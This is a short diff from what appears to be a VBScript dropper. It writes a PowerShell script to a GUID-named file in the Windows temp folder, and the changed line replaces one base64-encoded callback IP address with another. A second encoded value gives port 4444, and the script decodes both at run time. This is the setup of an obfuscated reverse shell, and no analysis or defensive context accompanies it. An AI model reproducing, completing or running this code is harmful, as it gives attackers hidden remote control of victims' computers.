@@ -5,7 +5,7 @@ tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
 revsh = tempFolder & "\838e861f-78c6-4d73-8d6f-743bc6beadaf.ps1"
 Set objFile = objFSO.CreateTextFile(revsh, True)
 objFile.WriteLine "try {"
-objFile.WriteLine "    $i = 'NDUuOTMuMTM2LjI4'"
+objFile.WriteLine "    $i = 'MTYyLjE5LjEzNS4xODc='"
 objFile.WriteLine "    $k = 'NDQ0NA=='"
 objFile.WriteLine "    $j = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($i))"
 objFile.WriteLine "    $l = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($k))"
